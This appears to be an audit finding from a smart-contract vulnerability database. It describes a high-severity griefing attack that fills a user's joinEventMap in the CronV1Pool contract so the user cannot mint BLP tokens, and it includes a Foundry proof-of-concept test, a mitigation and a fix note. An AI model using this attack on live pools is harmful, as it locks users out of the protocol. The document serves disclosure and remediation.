# [H] **5.1.4 An attacker can block any address from joining the Pool and minting BLP Tokens by filling the

## Summary
Severity: High
Source: https://github.com/tintinweb/smart-contract-vulndb
Type: audit-issue

## Details
joinEventMap mapping.**

**Severity:** High Risk

**Context:** JoinEventLib.sol#L65-L137, Constants.sol#L

**Description:** An attacker can block any address from mintingBLP Tokens. This occurs due to theMAX_JOIN_-
EVENTSlimit, which is present in theJoinEventLiblibrary. The goal for an attacker is to block a legitimate user
from mintingBLP Tokens, by filling thejoinEventMapmapping.

The attacker can fill thejoinEventMapmapping by performing the following steps:

- The attacker mintsBLP Tokensfrom 50 different addresses.
- Each address transfers theBLP Tokens, alongside the join events, to the user targeted with a call to the
    CronV1Pool(pool).transferandCronV1Pool(pool).transferJoinEventfunctions respectively. Those
    transfers should happen in different blocks.

After 50 blocks (50 * 12s = 10 minutes) the attacker has blocked the legitimate user from minting
_BLP Tokens_, as the maximum size of thejoinEventMap‘ mapping has been reached.


The impact of this vulnerability can be significant, particularly for smart contracts that allow users to earn yield by
providing liquidity in third-party protocols. For example, if a governance proposal is initiated to generate yield by
providing liquidity in aCronV1Poolpool, the attacker could prevent the third-party protocol from integrating with the
CronV1Poolprotocol.

A proof-of-concept exploit demonstrating this vulnerability can be found below:

```
function testGriefingAttack() public {
console.log("-----------------------------");
console.log("Many Users mint BLP tokens and transfer the join events to the user 111 in order to
,! fill the array!");
```
```
for (uint j = 1; j < 51; j++) {
_addLiquidity(pool, address(j), address(j), 2_000, 2_000, 0);
vm.warp(block.timestamp + 12);
```
```
vm.startPrank(address(j));
//transfer the tokens
CronV1Pool(pool).transfer(address(111), CronV1Pool(pool).balanceOf(address(j)));
```
```
//transfer the join events to the address(111)
CronV1Pool(pool).transferJoinEvent(address(111), 0 , CronV1Pool(pool).balanceOf(address(j)));
vm.stopPrank();
}
```
```
console.log("Balance of address(111) before minting LP Tokens himself",
,! ICronV1Pool(pool).balanceOf(address(111)));
```
```
//user(111) wants to enter the pool
_addLiquidity(pool, address(111), address(111), 5_000, 5_000, 0);
```
```
console.log("Join Events of user address(111): ",
,! ICronV1Pool(pool).getJoinEvents(address(111)).length);
console.log("Balance of address(111) after adding the liquidity: ",
,! ICronV1Pool(pool).balanceOf(address(111)));
}
```
**Recommendation:** A possible mitigation could be to override the_movefunction of theBalancerPoolTokencon-
tract by also transferring thejoinEventsalongside the BLP tokens.

**Twamm:** Join Event / Holding Period & Penalty complete removed in commit3130e41.

**Spearbit:** Verified.
